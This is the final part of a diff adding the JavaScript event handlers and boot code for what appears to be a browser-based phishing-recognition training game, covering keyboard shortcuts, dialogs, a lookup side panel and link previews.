+  if (l && l.dataset.href) { linkbar.textContent = l.dataset.href; linkbar.hidden = false; }
+  else linkbar.hidden = true;
+}
+document.addEventListener('mouseover', linkHover);
+document.addEventListener('focusin', linkHover);
+
+// Attachment previews contain links too.
+$('#dlg-att').addEventListener('click', ev => {
+  const link = ev.target.closest('.ilink, .ibtn');
+  if (link) { ev.preventDefault(); $('#dlg-att').close(); showLinkToast(link.dataset.href); }
+});
+
+// Side panel tabs and drawer.
+$('#tab-lookup').addEventListener('click', () => setSideTab('lookup'));
+$('#tab-tray').addEventListener('click', () => setSideTab('tray'));
+$('.side-tabs').addEventListener('keydown', ev => {
+  if (ev.key !== 'ArrowRight' && ev.key !== 'ArrowLeft') return;
+  const next = state.sideTab === 'lookup' ? 'tray' : 'lookup';
+  setSideTab(next); $('#tab-' + next).focus(); ev.preventDefault();
+});
+$('#bar-lookup').addEventListener('click', () => setSideTab('lookup', true));
+$('#bar-tray').addEventListener('click', () => setSideTab('tray', true));
+$('#side-close').addEventListener('click', closeDrawer);
+$('#side').addEventListener('keydown', ev => { if (ev.key === 'Escape' && isDrawer()) closeDrawer(); });
+
+$('#lk-type').addEventListener('change', renderLookupForm);
+$('#lk-form').addEventListener('submit', ev => { ev.preventDefault(); runLookup(); });
+
+document.addEventListener('keydown', ev => {
+  if ($('#screen-game').hidden || ev.ctrlKey || ev.metaKey || ev.altKey) return;
+  if (document.querySelector('dialog[open]')) return;
+  const t = ev.target;
+  if (t && (t.tagName === 'INPUT' || t.tagName === 'TEXTAREA' || t.tagName === 'SELECT' || t.isContentEditable)) return;
+  if (ev.key === 'Escape' && !$('#toast').hidden) { $('#toast').hidden = true; return; }
+  const k = ev.key.toLowerCase();
+  if (k === 'p') { mark('phish'); ev.preventDefault(); }
+  else if (k === 'l') { mark('legit'); ev.preventDefault(); }
+  else if (k === 'j') { select(state.selected + 1, false); ev.preventDefault(); }
+  else if (k === 'k') { select(state.selected - 1, false); ev.preventDefault(); }
+});
+
+const dlgBrief = $('#dlg-briefing'), dlgReset = $('#dlg-reset');
+$('#btn-briefing').addEventListener('click', () => { renderBriefing(); dlgBrief.showModal(); });
+$('#btn-reset').addEventListener('click', () => dlgReset.showModal());
+$('#btn-reset-confirm').addEventListener('click', () => { dlgReset.close(); resetAll(); });
+for (const b of $$('dialog [data-close]')) b.addEventListener('click', () => b.closest('dialog').close());
+for (const d of $$('dialog')) d.addEventListener('click', ev => { if (ev.target === d) d.close(); });
+
+$('#btn-back-inbox').addEventListener('click', () => { renderGame(); show('game'); });
+$('#btn-print').addEventListener('click', () => window.print());
+$('#btn-new').addEventListener('click', () => dlgReset.showModal());
+
+/* ---------------- Boot ---------------- */
+renderLanding();
+renderLookupForm();
+if (!PAYLOADS) {
+  const f = $('#fatal');
+  f.hidden = false;
+  f.textContent = 'This is the unbuilt template. Run "node build.js" and open dist/game.html to play.';
+}
+if (state.screen !== 'landing' && state.setId) {
+  renderBriefing(); renderBar(); tick();
+  if (state.screen === 'game') { renderGame(); show('game', false); }
+  else show('briefing', false);
+} else show('landing', false);
+})();
+</script>
+</body>
+</html>
